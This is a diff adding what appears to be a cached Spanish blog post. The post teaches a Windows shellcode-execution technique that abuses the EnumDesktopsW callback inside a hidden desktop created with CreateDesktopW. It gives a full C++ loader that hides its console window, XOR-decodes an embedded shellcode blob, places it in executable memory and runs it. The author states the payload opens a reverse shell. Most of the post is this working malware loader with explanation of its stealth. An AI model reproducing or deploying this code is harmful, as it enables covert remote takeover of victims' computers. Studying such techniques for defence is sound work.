@@ -1,0 +1,176 @@
+I"�Q<p class="lead">Te explicare como use la funcion <code class="language-plaintext highlighter-rouge">EnumDesktopsW()</code> para ejecutar una shellcode en un escritorio creado con <code class="language-plaintext highlighter-rouge">CreateDesktopW()</code></p>
+<h2 id="enumdesktopsw">EnumDesktopsW</h2>
+
+<p>EnumDesktopsW es una funcion de la WinAPI la cual enumera todos los escritorios del usuario, cabe recalcar que solo enumera los cuales tengan acceso <code class="language-plaintext highlighter-rouge">DESKTOP_ENUMERATE</code> o <code class="language-plaintext highlighter-rouge">GENERIC_ALL</code>, lo que hace por detras esta funcion es invocar multiples veces a la funcion callback del parámetro <code class="language-plaintext highlighter-rouge">lpEnumFunc</code> hasta que termine de enumerar todos los escritorios.</p>
+
+<p><code class="language-plaintext highlighter-rouge">lpEnumFunc</code> es uno de los parametros que recibe <code class="language-plaintext highlighter-rouge">EnumDesktopsW()</code>, este parametro es un puntero a la callback  <code class="language-plaintext highlighter-rouge">DESKTOPENUMPROC</code>, su sintaxis es:</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">CALLBACK</span> <span class="nf">EnumDesktopProc</span><span class="p">(</span>
+  <span class="n">_In_</span> <span class="n">LPTSTR</span> <span class="n">lpszDesktop</span><span class="p">,</span>
+  <span class="n">_In_</span> <span class="n">LPARAM</span> <span class="n">lParam</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<h3 id="como-se-ejecuta-la-shellcode">¿Como se ejecuta la shellcode?</h3>
+
+<p>Basicamente hace esto:</p>
+
+<ul>
+  <li>Se asigna un buffer de memoria mediante una función como VirtualAlloc</li>
+  <li>Se copia la shellcode en la memoria recién asignada</li>
+  <li>Se usa EnumDesktopsW para enumerar los escritorios y mediante una funcion callback encontrar la dirección de una función que se puede usar para ejecutar la shellcode (La direccion que regresa VirtualAlloc)</li>
+</ul>
+
+<p>El codigo “base” para ejecutar una shellcode de esta forma tomando en cuenta la explicacion anterior, es:</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="n">hAlloc</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
+<span class="n">memcpy</span><span class="p">(</span><span class="n">hAlloc</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+<span class="n">EnumDesktopsW</span><span class="p">(</span><span class="n">GetProcessWindowStation</span><span class="p">(),(</span><span class="n">DESKTOPENUMPROCW</span><span class="p">)</span> <span class="n">hAlloc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Pero nos vamos a poner experimentadores y te voy a explicar como usando ese mismo codigo de base lo converti en algo bien genial</p>
+
+<h3 id="explicacion">Explicacion</h3>
+
+<p>Como en los demas tutoriales, te pondre todo el codigo y te explicare que hacen las funciones y como se ejecuta la shellcode</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Windows.h&gt;
+#include &lt;iostream&gt;
+</span>
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+	<span class="s">"</span><span class="se">\x92\x26\xed\x8a\x9e\x86\xa2\x6e\x6e\x6e\x2f\x3f\x2f\x3e</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x3c\x3f\x26\x5f\xbc\x0b\x26\xe5\x3c\x0e\x26\xe5\x3c\x76</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x38\x26\xe5\x3c\x4e\x23\x5f\xa7\x26\xe5\x1c\x3e\x26\x61</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\xd9\x24\x24\x26\x5f\xae\xc2\x52\x0f\x12\x6c\x42\x4e\x2f</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\xaf\xa7\x63\x2f\x6f\xaf\x8c\x83\x3c\x26\xe5\x3c\x4e\xe5</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x2c\x52\x2f\x3f\x26\x6f\xbe\x08\xef\x16\x76\x65\x6c\x61</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\xeb\x1c\x6e\x6e\x6e\xe5\xee\xe6\x6e\x6e\x6e\x26\xeb\xae</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x1a\x09\x26\x6f\xbe\xe5\x26\x76\x3e\x2a\xe5\x2e\x4e\x27</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x6f\xbe\x8d\x38\x23\x5f\xa7\x26\x91\xa7\x2f\xe5\x5a\xe6</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x26\x6f\xb8\x26\x5f\xae\xc2\x2f\xaf\xa7\x63\x2f\x6f\xaf</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x56\x8e\x1b\x9f\x22\x6d\x22\x4a\x66\x2b\x57\xbf\x1b\xb6</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x36\x2a\xe5\x2e\x4a\x27\x6f\xbe\x08\x2f\xe5\x62\x26\x2a</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\xe5\x2e\x72\x27\x6f\xbe\x2f\xe5\x6a\xe6\x26\x6f\xbe\x2f</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x36\x2f\x36\x30\x37\x34\x2f\x36\x2f\x37\x2f\x34\x26\xed</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x82\x4e\x2f\x3c\x91\x8e\x36\x2f\x37\x34\x26\xe5\x7c\x87</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x25\x91\x91\x91\x33\x27\xd0\x19\x1d\x5c\x31\x5d\x5c\x6e</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x6e\x2f\x38\x27\xe7\x88\x26\xef\x82\xce\x6f\x6e\x6e\x27</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\xe7\x8b\x27\xd2\x6c\x6e\x7f\x32\xae\xc6\x6f\x27\x2f\x3a</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x27\xe7\x8a\x22\xe7\x9f\x2f\xd4\x22\x19\x48\x69\x91\xbb</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x22\xe7\x84\x06\x6f\x6f\x6e\x6e\x37\x2f\xd4\x47\xee\x05</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x6e\x91\xbb\x04\x64\x2f\x30\x3e\x3e\x23\x5f\xa7\x23\x5f</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\xae\x26\x91\xae\x26\xe7\xac\x26\x91\xae\x26\xe7\xaf\x2f</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\xd4\x84\x61\xb1\x8e\x91\xbb\x26\xe7\xa9\x04\x7e\x2f\x36</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x22\xe7\x8c\x26\xe7\x97\x2f\xd4\xf7\xcb\x1a\x0f\x91\xbb</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\xeb\xae\x1a\x64\x27\x91\xa0\x1b\x8b\x86\xfd\x6e\x6e\x6e</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x26\xed\x82\x7e\x26\xe7\x8c\x23\x5f\xa7\x04\x6a\x2f\x36</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x26\xe7\x97\x2f\xd4\x6c\xb7\xa6\x31\x91\xbb\xed\x96\x6e</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x10\x3b\x26\xed\xaa\x4e\x30\xe7\x98\x04\x2e\x2f\x37\x06</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x6e\x7e\x6e\x6e\x2f\x36\x26\xe7\x9c\x26\x5f\xa7\x2f\xd4</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x36\xca\x3d\x8b\x91\xbb\x26\xe7\xad\x27\xe7\xa9\x23\x5f</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\xa7\x27\xe7\x9e\x26\xe7\xb4\x26\xe7\x97\x2f\xd4\x6c\xb7</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\xa6\x31\x91\xbb\xed\x96\x6e\x13\x46\x36\x2f\x39\x37\x06</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x6e\x2e\x6e\x6e\x2f\x36\x04\x6e\x34\x2f\xd4\x65\x41\x61</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x5e\x91\xbb\x39\x37\x2f\xd4\x1b\x00\x23\x0f\x91\xbb\x27</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x91\xa0\x87\x52\x91\x91\x91\x26\x6f\xad\x26\x47\xa8\x26</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\xeb\x98\x1b\xda\x2f\x91\x89\x36\x04\x6e\x37\x27\xa9\xac</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x9e\xdb\xcc\x38\x91\xbb</span><span class="s">"</span>
+<span class="p">};</span>
+
+<span class="k">typedef</span> <span class="nf">BOOL</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">ShellcodeFunction</span><span class="p">)(</span><span class="n">LPCWSTR</span><span class="p">,</span> <span class="n">LPARAM</span><span class="p">);</span>
+
+<span class="n">DWORD</span> <span class="n">WINAPI</span> <span class="nf">SwitchDesktopThread</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">lpParameter</span><span class="p">){</span>
+    <span class="n">HDESK</span> <span class="n">hDesktop</span> <span class="o">=</span> <span class="k">static_cast</span><span class="o">&lt;</span><span class="n">HDESK</span><span class="o">&gt;</span><span class="p">(</span><span class="n">lpParameter</span><span class="p">);</span>
+    <span class="n">SetThreadDesktop</span><span class="p">(</span><span class="n">hDesktop</span><span class="p">);</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+	<span class="n">HWND</span> <span class="n">hWin</span> <span class="o">=</span> <span class="n">GetConsoleWindow</span><span class="p">();</span>
+	<span class="n">ShowWindow</span><span class="p">(</span><span class="n">hWin</span><span class="p">,</span> <span class="n">SW_HIDE</span><span class="p">);</span>
+	
+    <span class="n">HDESK</span> <span class="n">hDesktop</span> <span class="o">=</span> <span class="n">CreateDesktopW</span><span class="p">(</span><span class="s">L"ShellcodeDesk"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">GENERIC_ALL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">hDesktop</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">){</span>
+        <span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SwitchDesktopThread</span><span class="p">,</span> <span class="n">hDesktop</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">hThread</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
+            <span class="n">CloseDesktop</span><span class="p">(</span><span class="n">hDesktop</span><span class="p">);</span>
+            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+        	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>
+	
+	        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+	            <span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span><span class="p">)(</span><span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">byte</span><span class="p">)</span><span class="sc">'\x6e'</span><span class="p">);</span>
+	        <span class="p">}</span>
+	
+	        <span class="k">const</span> <span class="kt">size_t</span> <span class="n">shellcodeSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>
+	
+	        <span class="n">LPVOID</span> <span class="n">hAlloc</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span>
+	            <span class="nb">NULL</span><span class="p">,</span>
+	            <span class="n">shellcodeSize</span><span class="p">,</span>
+	            <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span>
+	            <span class="n">PAGE_EXECUTE_READWRITE</span>
+	        <span class="p">);</span>
+	
+	        <span class="n">memcpy</span><span class="p">(</span><span class="n">hAlloc</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcodeSize</span><span class="p">);</span>
+	        <span class="n">EnumDesktopsW</span><span class="p">(</span><span class="n">GetProcessWindowStation</span><span class="p">(),</span> <span class="p">(</span><span class="n">DESKTOPENUMPROCW</span><span class="p">)</span><span class="n">hAlloc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+	        <span class="n">CloseDesktop</span><span class="p">(</span><span class="n">hDesktop</span><span class="p">);</span>
+		<span class="p">}</span>
+
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="explicacion-rapida">Explicacion rapida</h3>
+
+<p>Se crea un hilo para ejecutar <code class="language-plaintext highlighter-rouge">SwitchDesktopThread()</code>, asi que cuando se ejecute esa funcion cambiara al escritorio mediante <code class="language-plaintext highlighter-rouge">SetThreadDesktop()</code>, ese escritorio se llama “ShellcodeDesk” creado con <code class="language-plaintext highlighter-rouge">CreateDesktop()</code>, permitiendo que esa accion ocurra en segundo plano en ese hilo que se creo, despues se reserva memoria con <code class="language-plaintext highlighter-rouge">VirtualAlloc()</code> para la shellcode y se inyectara en el contexto del escritorio “ShellcodeDesk” mediante la funcion de callback <code class="language-plaintext highlighter-rouge">EnumDesktopW()</code>, permitiento asi que el escritorio actual del usuario no este ocurriendo nada, y todo el proceso de la shellcode se este ejecutando en el escritorio “ShellcodeDesk”</p>
+
+<h3 id="explicacion-de-cada-funcion">Explicacion de cada funcion</h3>
+
+<h4 id="createdesktopw">CreateDesktopW()</h4>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HDESK</span> <span class="n">hDesktop</span> <span class="o">=</span> <span class="n">CreateDesktopW</span><span class="p">(</span><span class="s">L"ShellcodeDesk"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">GENERIC_ALL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Creara un nuevo escritorio llamado “ShellcodeDesk” donde se le da acceso “GENERIC_ALL” para tener control total de ese ecritorio, y ojo,
+para windows los escritorios solo son objetos que representan un area virtual la cual ejecuta aplicaciones y tiene ventanas, cada escritorio
+esta aislado de otro escritorio, es decir, que cada escritorio tiene sus ventanas, aplicaciones.</p>
+
+<p>Como curiosidad, la creacion de escritorios esta limitada por el tamaño del heap del escritorio del sistema, el cual es de 48 MB</p>
+
+<p>Y si ese escritorio se crea, osea es diferente de NULL, regresa un identificador que se guarda en <code class="language-plaintext highlighter-rouge">hDesktop</code>, y pasara a la funcion CreateThread()</p>
+
+<h4 id="createthread">CreateThread()</h4>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SwitchDesktopThread</span><span class="p">,</span> <span class="n">hDesktop</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Ahora, cuando se hace un llamado a esta funcion lo que esta pasando es que crea un hilo en el proceso actual, y date cuenta que este hilo su tercer parametro es un puntero del nombre de la funcion que se va a ejecutar en ese hilo, osea <code class="language-plaintext highlighter-rouge">SwitchDesktopThread</code>, tambien se le pasa <code class="language-plaintext highlighter-rouge">hDesktop</code> que es la variable que tiene el escritorio creado con <code class="language-plaintext highlighter-rouge">CreateDesktopW()</code></p>
+
+<h4 id="switchdesktopthread">SwitchDesktopThread()</h4>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="n">WINAPI</span> <span class="nf">SwitchDesktopThread</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">lpParameter</span><span class="p">){</span>
+    <span class="n">HDESK</span> <span class="n">hDesktop</span> <span class="o">=</span> <span class="k">static_cast</span><span class="o">&lt;</span><span class="n">HDESK</span><span class="o">&gt;</span><span class="p">(</span><span class="n">lpParameter</span><span class="p">);</span>
+    <span class="n">SetThreadDesktop</span><span class="p">(</span><span class="n">hDesktop</span><span class="p">);</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Ahora con <code class="language-plaintext highlighter-rouge">SwitchDesktopThread</code> lo que esta haciendo es cambiar al escritorio creado con <code class="language-plaintext highlighter-rouge">CreateDesktopW()</code> mediante <code class="language-plaintext highlighter-rouge">SetThreadDesktop()</code>, sin embargo este cambio lo hace asignando el escritorio creado al hilo al que pertenece o del cual se esta ejecutando, osea, el escritorio “ShellcodeDesk” que se creo con <code class="language-plaintext highlighter-rouge">CreateDesktopW()</code> se estaria ejecutando en el hilo creado con <code class="language-plaintext highlighter-rouge">CreateThread</code>, por eso mismo, en uno de los parametros de <code class="language-plaintext highlighter-rouge">CreateThread</code> se le pasa <code class="language-plaintext highlighter-rouge">hDesktop</code>, que es la variable que tiene el nombre de escritorio “ShellcodeDesk”.</p>
+
+<h4 id="ejecucion-de-la-shellcode">Ejecucion de la shellcode</h4>
+
+<p>Y en caso de que todo vaya bien todas las intrucciones que le siguen se estarian ejecutando en ese escritorio (“ShellcodeDesk”) lo cual permite que esten aisladas del escritorio actual del usuario, y ya al final con <code class="language-plaintext highlighter-rouge">EnumDesktopsW()</code> se ejecuta las shellcode en el contexto del escritorio creado, osea ShellcodeDesk</p>
+
+<h4 id="resultados">Resultados</h4>
+
+<p>Llega una reverse shell por que eso es lo que hace la shellcode</p>
+
+<p><img src="/assets/img/enumDesktopW/1.png" alt="" /></p>
+
+<p><img src="/assets/img/enumDesktopW/2.png" alt="" /></p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+:ET
